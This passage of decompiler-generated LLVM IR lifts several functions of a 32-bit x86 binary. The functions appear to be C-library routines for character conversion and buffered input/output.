  store i32 %v1_804f46a, i32* %v2_804f46c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f471

dec_label_pc_804f471:                             ; preds = %dec_label_pc_804f43c, %dec_label_pc_804f465
  %v0_804f471 = phi i32 [ %v6_804f459, %dec_label_pc_804f43c ], [ -1, %dec_label_pc_804f465 ]
  %v2_804f474 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f474, i32* @esi, align 4
  ret i32 %v0_804f471

; uselistorder directives
  uselistorder i32 %v6_804f459, { 1, 0, 2 }
  uselistorder i32 %v0_804f451, { 1, 0 }
  uselistorder label %dec_label_pc_804f471, { 1, 0 }
}

define i32 @function_804f478() local_unnamed_addr {
dec_label_pc_804f478:
  ret i32 ptrtoint (i32* @global_var_80580c4.185 to i32)
}

define i32 @function_804f480() local_unnamed_addr {
dec_label_pc_804f480:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804f48b = icmp eq i32 %tmp5, 0
  %v1_804f48d = icmp eq i1 %v1_804f48b, false
  br i1 %v1_804f48d, label %dec_label_pc_804f495, label %dec_label_pc_804f48f

dec_label_pc_804f48f:                             ; preds = %dec_label_pc_804f480
  %v2_804f48f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804f495

dec_label_pc_804f495:                             ; preds = %dec_label_pc_804f480, %dec_label_pc_804f48f
  %v0_804f4b1 = phi i32 [ %tmp5, %dec_label_pc_804f480 ], [ %v2_804f48f, %dec_label_pc_804f48f ]
  %v0_804f499 = phi i32 [ %tmp4, %dec_label_pc_804f480 ], [ 0, %dec_label_pc_804f48f ]
  %v2_804f495 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_804f499, i32* %stack_var_-4, align 4
  store i32 %v2_804f495, i32* %stack_var_-8, align 4
  %v2_804f4ac = ptrtoint i32* %stack_var_-8 to i32
  %v5_804f4b2 = inttoptr i32 %v0_804f4b1 to i8*
  %v6_804f4b2 = call i32 @function_804f4e4(i8* %v5_804f4b2, i32 %v2_804f4ac, i32 1, i32 16, i32 %tmp)
  %v1_804f4ba = icmp eq i32 %v6_804f4b2, 0
  %v1_804f4bc = icmp eq i1 %v1_804f4ba, false
  br i1 %v1_804f4bc, label %dec_label_pc_804f4c0, label %dec_label_pc_804f4be

dec_label_pc_804f4be:                             ; preds = %dec_label_pc_804f495
  %v1_804f4be = and i32 %v6_804f4b2, -256
  %v2_804f4be = or i32 %v1_804f4be, 1
  br label %dec_label_pc_804f4c0

dec_label_pc_804f4c0:                             ; preds = %dec_label_pc_804f495, %dec_label_pc_804f4be
  %v0_804f4c3 = phi i32 [ %v6_804f4b2, %dec_label_pc_804f495 ], [ %v2_804f4be, %dec_label_pc_804f4be ]
  ret i32 %v0_804f4c3

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804f4c0, { 1, 0 }
  uselistorder label %dec_label_pc_804f495, { 1, 0 }
}

define i32 @function_804f4c4() local_unnamed_addr {
dec_label_pc_804f4c4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804f4d9 = inttoptr i32 %tmp to i8*
  %v6_804f4d9 = call i32 @function_804f4e4(i8* %v5_804f4d9, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804f4d9
}

define i32 @function_804f4e4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804f4e4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804f4e7 = load i32, i32* @ebx, align 4
  %v4_804f4eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f4eb, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804f4f7 = icmp eq i8* %arg1, null
  br i1 %v1_804f4f7, label %dec_label_pc_804f52b.thread, label %dec_label_pc_804f4fb

dec_label_pc_804f4fb:                             ; preds = %dec_label_pc_804f4e4
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804f500 = icmp eq i32 %v4_804f4eb, %arg2
  %v1_804f502 = icmp eq i1 %v12_804f500, false
  br i1 %v1_804f502, label %dec_label_pc_804f52b, label %dec_label_pc_804f525

dec_label_pc_804f52b.thread:                      ; preds = %dec_label_pc_804f4e4
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804f508 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f508, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f535

dec_label_pc_804f511:                             ; preds = %dec_label_pc_804f53c
  %v1_804f511 = call i32 @function_804b4bc(i32 %v0_804f4e7)
  store i32 %v1_804f511, i32* %eax.global-to-local, align 4
  %v1_804f516 = inttoptr i32 %v1_804f511 to i32*
  store i32 84, i32* %v1_804f516, align 4
  br label %dec_label_pc_804f562

dec_label_pc_804f521:                             ; preds = %dec_label_pc_804f543
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804f557.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f553

dec_label_pc_804f525:                             ; preds = %dec_label_pc_804f4fb
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804f527 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f527, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f52b

dec_label_pc_804f52b:                             ; preds = %dec_label_pc_804f4fb, %dec_label_pc_804f525
  %v2_804f54316 = phi i32 [ %v4_804f4eb, %dec_label_pc_804f4fb ], [ %v2_804f527, %dec_label_pc_804f525 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp34 = icmp ult i32 %arg4, %arg3
  br i1 %tmp34, label %dec_label_pc_804f533, label %dec_label_pc_804f535

dec_label_pc_804f533:                             ; preds = %dec_label_pc_804f52b
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f535

dec_label_pc_804f535:                             ; preds = %dec_label_pc_804f52b.thread, %dec_label_pc_804f52b, %dec_label_pc_804f533
  %v2_804f5431633 = phi i32 [ %v2_804f54316, %dec_label_pc_804f52b ], [ %v2_804f54316, %dec_label_pc_804f533 ], [ %v2_804f508, %dec_label_pc_804f52b.thread ]
  %v0_804f538 = phi i32 [ %arg3, %dec_label_pc_804f52b ], [ %arg4, %dec_label_pc_804f533 ], [ %arg3, %dec_label_pc_804f52b.thread ]
  %v1_804f535 = inttoptr i32 %arg2 to i32*
  %v2_804f535 = load i32, i32* %v1_804f535, align 4
  store i32 %v2_804f535, i32* %esi.global-to-local, align 4
  store i32 %v0_804f538, i32* @ecx, align 4
  %v1_804f54f4 = icmp eq i32 %v0_804f538, 0
  %v1_804f55111 = icmp eq i1 %v1_804f54f4, false
  br i1 %v1_804f55111, label %dec_label_pc_804f53c, label %dec_label_pc_804f553

dec_label_pc_804f53c:                             ; preds = %dec_label_pc_804f535, %dec_label_pc_804f549
  %v2_804f543 = phi i32 [ %v2_804f54c, %dec_label_pc_804f549 ], [ %v2_804f5431633, %dec_label_pc_804f535 ]
  %v0_804f53c = phi i32 [ %v1_804f549, %dec_label_pc_804f549 ], [ %v2_804f535, %dec_label_pc_804f535 ]
  %v1_804f53c = inttoptr i32 %v0_804f53c to i32*
  %v2_804f53c = load i32, i32* %v1_804f53c, align 4
  store i32 %v2_804f53c, i32* %eax.global-to-local, align 4
  %v6_804f541 = icmp ugt i32 %v2_804f53c, 127
  br i1 %v6_804f541, label %dec_label_pc_804f511, label %dec_label_pc_804f543

dec_label_pc_804f543:                             ; preds = %dec_label_pc_804f53c
  %v1_804f543 = trunc i32 %v2_804f53c to i8
  %v3_804f543 = inttoptr i32 %v2_804f543 to i8*
  store i8 %v1_804f543, i8* %v3_804f543, align 1
  %v0_804f545 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f545 = trunc i32 %v0_804f545 to i8
  %v4_804f545 = icmp eq i8 %v3_804f545, 0
  br i1 %v4_804f545, label %dec_label_pc_804f521, label %dec_label_pc_804f549

dec_label_pc_804f549:                             ; preds = %dec_label_pc_804f543
  %v0_804f549 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f549 = add i32 %v0_804f549, 4
  store i32 %v1_804f549, i32* %esi.global-to-local, align 4
  %v0_804f54c = load i32, i32* %edx.global-to-local, align 4
  %v1_804f54c = load i32, i32* %edi.global-to-local, align 4
  %v2_804f54c = add i32 %v1_804f54c, %v0_804f54c
  store i32 %v2_804f54c, i32* %edx.global-to-local, align 4
  %v0_804f54e = load i32, i32* @ecx, align 4
  %v1_804f54e = add i32 %v0_804f54e, -1
  %v8_804f54e = icmp eq i32 %v1_804f54e, 0
  store i32 %v1_804f54e, i32* @ecx, align 4
  %v1_804f551 = icmp eq i1 %v8_804f54e, false
  br i1 %v1_804f551, label %dec_label_pc_804f53c, label %dec_label_pc_804f553

dec_label_pc_804f553:                             ; preds = %dec_label_pc_804f549, %dec_label_pc_804f535, %dec_label_pc_804f521
  %v0_804f55b = phi i32 [ 0, %dec_label_pc_804f521 ], [ %v2_804f535, %dec_label_pc_804f535 ], [ %v1_804f549, %dec_label_pc_804f549 ]
  %v0_804f557 = phi i32 [ %v0_804f557.pre, %dec_label_pc_804f521 ], [ %v2_804f5431633, %dec_label_pc_804f535 ], [ %v2_804f54c, %dec_label_pc_804f549 ]
  %v2_804f553 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f553, i32* %eax.global-to-local, align 4
  %v12_804f557 = icmp eq i32 %v0_804f557, %v2_804f553
  br i1 %v12_804f557, label %dec_label_pc_804f55e, label %dec_label_pc_804f55b

dec_label_pc_804f55b:                             ; preds = %dec_label_pc_804f553
  %v1_804f55b = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f55b = inttoptr i32 %v1_804f55b to i32*
  store i32 %v0_804f55b, i32* %v2_804f55b, align 4
  br label %dec_label_pc_804f55e

dec_label_pc_804f55e:                             ; preds = %dec_label_pc_804f553, %dec_label_pc_804f55b
  %v0_804f55e = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f55e, i32* %eax.global-to-local, align 4
  %v1_804f560 = load i32, i32* @ecx, align 4
  %v2_804f560 = sub i32 %v0_804f55e, %v1_804f560
  br label %dec_label_pc_804f562

dec_label_pc_804f562:                             ; preds = %dec_label_pc_804f511, %dec_label_pc_804f55e
  %storemerge2 = phi i32 [ %v2_804f560, %dec_label_pc_804f55e ], [ -1, %dec_label_pc_804f511 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  store i32 %v0_804f4e7, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v2_804f54c, { 0, 2, 1 }
  uselistorder i32 %v1_804f549, { 0, 2, 1 }
  uselistorder i32 %v2_804f535, { 1, 0, 2 }
  uselistorder i32 %v0_804f538, { 1, 0 }
  uselistorder i32 %v2_804f5431633, { 1, 0 }
  uselistorder i32 %v4_804f4eb, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 5, 2, 6, 3, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f562, { 1, 0 }
  uselistorder label %dec_label_pc_804f55e, { 1, 0 }
  uselistorder label %dec_label_pc_804f53c, { 1, 0 }
  uselistorder label %dec_label_pc_804f535, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f52b, { 1, 0 }
}

define i32 @function_804f56c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f56c:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f56c = load i32, i32* @ebx, align 4
  store i32 %v0_804f56c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804f577 = call i32 @function_804efec(i32 %arg1, i32 3, i32 %tmp11, i32 %tmp7)
  store i32 %v4_804f577, i32* @eax, align 4
  %v10_804f581 = icmp eq i32 %v4_804f577, -1
  br i1 %v10_804f581, label %dec_label_pc_804f598, label %dec_label_pc_804f586

dec_label_pc_804f586:                             ; preds = %dec_label_pc_804f56c
  %v0_804f586 = load i32, i32* @ebx, align 4
  %v4_804f58e = inttoptr i32 %arg2 to i8*
  %v5_804f58e = call i32 @function_804b990(i32 %v4_804f577, i8* %v4_804f58e, i32 0, i32 %v0_804f586)
  br label %dec_label_pc_804f598

dec_label_pc_804f598:                             ; preds = %dec_label_pc_804f56c, %dec_label_pc_804f586
  %v0_804f598 = phi i32 [ 0, %dec_label_pc_804f56c ], [ %v5_804f58e, %dec_label_pc_804f586 ]
  %v2_804f59c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f59c, i32* @ebx, align 4
  ret i32 %v0_804f598

; uselistorder directives
  uselistorder i32 %v4_804f577, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804efec, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f598, { 1, 0 }
}

define i32 @function_804f5a0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f5a0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804f5a1 = load i32, i32* @edi, align 4
  %v0_804f5a3 = load i32, i32* @ebx, align 4
  %v4_804f5a7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f5a7, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804f5b34 = icmp eq i32 %arg3, 0
  br i1 %v1_804f5b34, label %dec_label_pc_804f612, label %dec_label_pc_804f5b8.lr.ph

dec_label_pc_804f5b8.lr.ph:                       ; preds = %dec_label_pc_804f5a0
  br label %dec_label_pc_804f5b8

dec_label_pc_804f5b8:                             ; preds = %dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge, %dec_label_pc_804f5b8.lr.ph
  %v0_804f5c8 = phi i32 [ %v4_804f5a7, %dec_label_pc_804f5b8.lr.ph ], [ %v0_804f5c8.pre, %dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge ]
  %v0_804f5c7 = phi i32 [ %arg2, %dec_label_pc_804f5b8.lr.ph ], [ %v2_804f5d9, %dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge ]
  %v0_804f5ba.in = phi i32 [ %arg3, %dec_label_pc_804f5b8.lr.ph ], [ %v2_804f5d7, %dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge ]
  %v0_804f5ba = icmp slt i32 %v0_804f5ba.in, 0
  store i32 %v0_804f5ba.in, i32* %ebp.global-to-local, align 4
  %v2_804f5ba = icmp eq i1 %v0_804f5ba, false
  %storemerge = select i1 %v2_804f5ba, i32 %v0_804f5ba.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804f5c8 = add i32 %v0_804f5c8, 4
  %v2_804f5c8 = inttoptr i32 %v1_804f5c8 to i32*
  %v3_804f5c8 = load i32, i32* %v2_804f5c8, align 4
  %tmp36 = inttoptr i32 %v0_804f5c7 to i32*
  %v5_804f5cb = call i32 @function_804b464(i32 %v3_804f5c8, i32* %tmp36, i32 %storemerge)
  store i32 %v5_804f5cb, i32* %eax.global-to-local, align 4
  %v2_804f5d3 = icmp slt i32 %v5_804f5cb, 0
  br i1 %v2_804f5d3, label %dec_label_pc_804f5dd, label %dec_label_pc_804f5d7

dec_label_pc_804f5d7:                             ; preds = %dec_label_pc_804f5b8
  %v0_804f5d7 = load i32, i32* @ebx, align 4
  %v2_804f5d7 = sub i32 %v0_804f5d7, %v5_804f5cb
  %v12_804f5d7 = icmp eq i32 %v2_804f5d7, 0
  store i32 %v2_804f5d7, i32* @ebx, align 4
  %v0_804f5d9 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f5d9 = add i32 %v0_804f5d9, %v5_804f5cb
  store i32 %v2_804f5d9, i32* %esi.global-to-local, align 4
  br i1 %v12_804f5d7, label %dec_label_pc_804f612, label %dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge

dec_label_pc_804f5d7.dec_label_pc_804f5b8_crit_edge: ; preds = %dec_label_pc_804f5d7
  %v0_804f5c8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f5b8

dec_label_pc_804f5dd:                             ; preds = %dec_label_pc_804f5b8
  %v0_804f5dd = load i32, i32* @edi, align 4
  %v1_804f5dd = add i32 %v0_804f5dd, 8
  %v2_804f5dd = inttoptr i32 %v1_804f5dd to i32*
  %v3_804f5dd = load i32, i32* %v2_804f5dd, align 4
  store i32 %v3_804f5dd, i32* @edx, align 4
  %v1_804f5e0 = add i32 %v0_804f5dd, 12
  %v2_804f5e0 = inttoptr i32 %v1_804f5e0 to i32*
  %v3_804f5e0 = load i32, i32* %v2_804f5e0, align 4
  store i32 %v3_804f5e0, i32* %eax.global-to-local, align 4
  %v1_804f5e3 = inttoptr i32 %v0_804f5dd to i16*
  %v2_804f5e3 = load i16, i16* %v1_804f5e3, align 2
  %v3_804f5e3 = or i16 %v2_804f5e3, 8
  store i16 %v3_804f5e3, i16* %v1_804f5e3, align 2
  %v0_804f5e7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5e7 = load i32, i32* @edx, align 4
  %v2_804f5e7 = sub i32 %v0_804f5e7, %v1_804f5e7
  %v12_804f5e7 = icmp eq i32 %v2_804f5e7, 0
  store i32 %v2_804f5e7, i32* %eax.global-to-local, align 4
  %v4_804f60e.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804f5e7, label %dec_label_pc_804f60e, label %dec_label_pc_804f5eb

dec_label_pc_804f5eb:                             ; preds = %dec_label_pc_804f5dd
  %v6_804f5ed = icmp ugt i32 %v2_804f5e7, %v4_804f60e.pre
  br i1 %v6_804f5ed, label %dec_label_pc_804f5f1.preheader, label %dec_label_pc_804f5ef

dec_label_pc_804f5ef:                             ; preds = %dec_label_pc_804f5eb
  store i32 %v2_804f5e7, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f5f1.preheader

dec_label_pc_804f5f1.preheader:                   ; preds = %dec_label_pc_804f5ef, %dec_label_pc_804f5eb
  %v0_804f5f1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f5f1

dec_label_pc_804f5f1:                             ; preds = %dec_label_pc_804f5f1.preheader, %dec_label_pc_804f603
  %v2_804f5f3 = phi i32 [ %v1_804f5e7, %dec_label_pc_804f5f1.preheader ], [ %v1_804f5ff, %dec_label_pc_804f603 ]
  %v4_804f5f1 = phi i32 [ %v2_804f5e7, %dec_label_pc_804f5f1.preheader ], [ %v0_804f5f5, %dec_label_pc_804f603 ]
  %v0_804f5f1 = phi i32 [ %v0_804f5f1.pre, %dec_label_pc_804f5f1.preheader ], [ %v1_804f603, %dec_label_pc_804f603 ]
  %v1_804f5f1 = inttoptr i32 %v0_804f5f1 to i8*
  %v2_804f5f1 = load i8, i8* %v1_804f5f1, align 1
  %v3_804f5f1 = zext i8 %v2_804f5f1 to i32
  %v5_804f5f1 = and i32 %v4_804f5f1, -256
  %v6_804f5f1 = or i32 %v3_804f5f1, %v5_804f5f1
  store i32 %v6_804f5f1, i32* %eax.global-to-local, align 4
  %v3_804f5f3 = inttoptr i32 %v2_804f5f3 to i8*
  store i8 %v2_804f5f1, i8* %v3_804f5f3, align 1
  %v0_804f5f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5f5 = trunc i32 %v0_804f5f5 to i8
  %v10_804f5f5 = icmp eq i8 %v1_804f5f5, 10
  %v1_804f5f7 = icmp eq i1 %v10_804f5f5, false
  br i1 %v1_804f5f7, label %dec_label_pc_804f5ff, label %dec_label_pc_804f5f9

dec_label_pc_804f5f9:                             ; preds = %dec_label_pc_804f5f1
  %v0_804f5f9 = load i32, i32* @edi, align 4
  %v1_804f5f9 = add i32 %v0_804f5f9, 1
  %v2_804f5f9 = inttoptr i32 %v1_804f5f9 to i8*
  %v3_804f5f9 = load i8, i8* %v2_804f5f9, align 1
  %v4_804f5f9 = urem i8 %v3_804f5f9, 2
  %v5_804f5f9 = icmp eq i8 %v4_804f5f9, 0
  %v1_804f5fd = icmp eq i1 %v5_804f5f9, false
  br i1 %v1_804f5fd, label %dec_label_pc_804f5f9.dec_label_pc_804f606_crit_edge, label %dec_label_pc_804f5ff

dec_label_pc_804f5f9.dec_label_pc_804f606_crit_edge: ; preds = %dec_label_pc_804f5f9
  %v0_804f606.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f606

dec_label_pc_804f5ff:                             ; preds = %dec_label_pc_804f5f9, %dec_label_pc_804f5f1
  %v0_804f5ff = load i32, i32* @edx, align 4
  %v1_804f5ff = add i32 %v0_804f5ff, 1
  store i32 %v1_804f5ff, i32* @edx, align 4
  %v0_804f600 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f600 = add i32 %v0_804f600, -1
  %v8_804f600 = icmp eq i32 %v1_804f600, 0
  store i32 %v1_804f600, i32* %ebp.global-to-local, align 4
  br i1 %v8_804f600, label %dec_label_pc_804f5ff.dec_label_pc_804f606_crit_edge, label %dec_label_pc_804f603

dec_label_pc_804f5ff.dec_label_pc_804f606_crit_edge: ; preds = %dec_label_pc_804f5ff
  %v1_804f606.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f606

dec_label_pc_804f603:                             ; preds = %dec_label_pc_804f5ff
  %v0_804f603 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f603 = add i32 %v0_804f603, 1
  store i32 %v1_804f603, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f5f1

dec_label_pc_804f606:                             ; preds = %dec_label_pc_804f5ff.dec_label_pc_804f606_crit_edge, %dec_label_pc_804f5f9.dec_label_pc_804f606_crit_edge
  %v1_804f606 = phi i32 [ %v0_804f5f9, %dec_label_pc_804f5f9.dec_label_pc_804f606_crit_edge ], [ %v1_804f606.pre, %dec_label_pc_804f5ff.dec_label_pc_804f606_crit_edge ]
  %v0_804f606 = phi i32 [ %v0_804f606.pre, %dec_label_pc_804f5f9.dec_label_pc_804f606_crit_edge ], [ %v1_804f5ff, %dec_label_pc_804f5ff.dec_label_pc_804f606_crit_edge ]
  %v2_804f606 = add i32 %v1_804f606, 16
  %v3_804f606 = inttoptr i32 %v2_804f606 to i32*
  store i32 %v0_804f606, i32* %v3_804f606, align 4
  %v0_804f609 = load i32, i32* @edx, align 4
  %v1_804f609 = load i32, i32* @edi, align 4
  %v2_804f609 = add i32 %v1_804f609, 8
  %v3_804f609 = inttoptr i32 %v2_804f609 to i32*
  %v4_804f609 = load i32, i32* %v3_804f609, align 4
  %v5_804f609 = sub i32 %v0_804f609, %v4_804f609
  store i32 %v5_804f609, i32* @edx, align 4
  %v0_804f60c = load i32, i32* @ebx, align 4
  %v2_804f60c = sub i32 %v0_804f60c, %v5_804f609
  br label %dec_label_pc_804f60e

dec_label_pc_804f60e:                             ; preds = %dec_label_pc_804f5dd, %dec_label_pc_804f606
  %v4_804f60e = phi i32 [ %v2_804f60c, %dec_label_pc_804f606 ], [ %v4_804f60e.pre, %dec_label_pc_804f5dd ]
  %v5_804f60e = sub i32 %arg3, %v4_804f60e
  br label %dec_label_pc_804f612

dec_label_pc_804f612:                             ; preds = %dec_label_pc_804f5d7, %dec_label_pc_804f5a0, %dec_label_pc_804f60e
  %stack_var_12.0 = phi i32 [ %v5_804f60e, %dec_label_pc_804f60e ], [ 0, %dec_label_pc_804f5a0 ], [ %arg3, %dec_label_pc_804f5d7 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_804f5a3, i32* @ebx, align 4
  store i32 %v0_804f5a1, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804f603, { 1, 0 }
  uselistorder i32 %v1_804f600, { 1, 0 }
  uselistorder i32 %v1_804f5ff, { 0, 2, 1 }
  uselistorder i32 %v0_804f5f5, { 1, 0 }
  uselistorder i32 %v2_804f5d9, { 1, 0 }
  uselistorder i32 %v2_804f5d7, { 1, 2, 0 }
  uselistorder i32 %v5_804f5cb, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @function_804b464, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804f612, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f60e, { 1, 0 }
  uselistorder label %dec_label_pc_804f5f1, { 1, 0 }
}

define i32 @function_804f620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f620:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f620 = load i32, i32* @ebp, align 4
  %v0_804f621 = load i32, i32* @edi, align 4
  %v0_804f622 = load i32, i32* @esi, align 4
  %v0_804f623 = load i32, i32* @ebx, align 4
  store i32 %v0_804f623, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804f633 = add i32 %arg3, 1
  %v2_804f633 = inttoptr i32 %v1_804f633 to i8*
  %v3_804f633 = load i8, i8* %v2_804f633, align 1
  %v4_804f633 = and i8 %v3_804f633, 2
  %v5_804f633 = icmp eq i8 %v4_804f633, 0
  %v1_804f637 = icmp eq i1 %v5_804f633, false
  br i1 %v1_804f637, label %dec_label_pc_804f6ee, label %dec_label_pc_804f63d

dec_label_pc_804f63d:                             ; preds = %dec_label_pc_804f620
  %v1_804f63d = add i32 %arg3, 4
  %v2_804f63d = inttoptr i32 %v1_804f63d to i32*
  %v3_804f63d = load i32, i32* %v2_804f63d, align 4
  %v13_804f63d = icmp eq i32 %v3_804f63d, -2
  %v1_804f641 = add i32 %arg3, 16
  %v2_804f641 = inttoptr i32 %v1_804f641 to i32*
  %v3_804f641 = load i32, i32* %v2_804f641, align 4
  store i32 %v3_804f641, i32* @edx, align 4
  %v1_804f644 = add i32 %arg3, 12
  %v2_804f644 = inttoptr i32 %v1_804f644 to i32*
  %v3_804f644 = load i32, i32* %v2_804f644, align 4
  %v1_804f647 = icmp eq i1 %v13_804f63d, false
  %v2_804f667 = sub i32 %v3_804f644, %v3_804f641
  store i32 %v2_804f667, i32* %eax.global-to-local, align 4
  br i1 %v1_804f647, label %dec_label_pc_804f667, label %dec_label_pc_804f649

dec_label_pc_804f649:                             ; preds = %dec_label_pc_804f63d
  %tmp22 = icmp ult i32 %v2_804f667, %arg2
  br i1 %tmp22, label %dec_label_pc_804f651, label %dec_label_pc_804f653

dec_label_pc_804f651:                             ; preds = %dec_label_pc_804f649
  br label %dec_label_pc_804f653

dec_label_pc_804f653:                             ; preds = %dec_label_pc_804f649, %dec_label_pc_804f651
  %storemerge = phi i32 [ %v2_804f667, %dec_label_pc_804f651 ], [ %arg2, %dec_label_pc_804f649 ]
  %v0_804f654 = phi i32 [ %v2_804f667, %dec_label_pc_804f651 ], [ %arg2, %dec_label_pc_804f649 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804f657 = inttoptr i32 %v3_804f641 to i16*
  %v4_804f657 = call i32 @function_804ce38(i16* %v3_804f657, i32 %v0_804f654, i32 %v2_804f667)
  store i32 %v4_804f657, i32* %eax.global-to-local, align 4
  %v0_804f65c = load i32, i32* @ebx, align 4
  %v1_804f65c = add i32 %v0_804f65c, 16
  %v2_804f65c = inttoptr i32 %v1_804f65c to i32*
  %v3_804f65c = load i32, i32* %v2_804f65c, align 4
  %v4_804f65c = load i32, i32* @esi, align 4
  %v5_804f65c = add i32 %v4_804f65c, %v3_804f65c
  store i32 %v5_804f65c, i32* %v2_804f65c, align 4
  br label %dec_label_pc_804f706

dec_label_pc_804f667:                             ; preds = %dec_label_pc_804f63d
  %v6_804f66b = icmp ult i32 %v2_804f667, %arg2
